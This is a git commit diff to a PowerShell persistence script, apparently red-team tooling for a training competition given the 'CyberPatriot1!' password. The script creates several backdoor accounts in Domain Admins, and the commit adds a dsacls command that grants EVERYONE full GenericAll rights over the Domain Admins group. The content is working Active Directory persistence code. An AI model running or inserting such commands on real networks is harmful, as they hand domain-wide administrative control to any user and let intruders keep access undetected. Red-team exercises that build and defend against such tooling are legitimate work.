8ba76815000caf8d045006d348cd7e4373cbe4a3
Altoid0 <Altoid0@IRON-FORGE>
2022-04-15 18:59:40 -0700

    GenericAll capabilities

--- Persistence/Add-PersistDomainAdmins.ps1
+++ Persistence/Add-PersistDomainAdmins.ps1
@@ -15,7 +15,9 @@ function Add-PersistDomainAdmins {
     
     @('a','b','c','d','e','f') | % {New-ADUser $_ -Enabled $true -AccountPassword (ConvertTo-SecureString "CyberPatriot1!" -AsPlainText -Force);Add-ADGroupMember -Identity "Domain Admins" -Members $_}
     #>
-    
+        # $Domain = $env:USERDNSDOMAIN
+        $DefaultPartition = (Get-ADDomainController).DefaultPartition
+        dsacls "CN=Domain Admins,CN=Users,$DefaultPartition" /G EVERYONE:GA
         @(
             'a',
             'b',
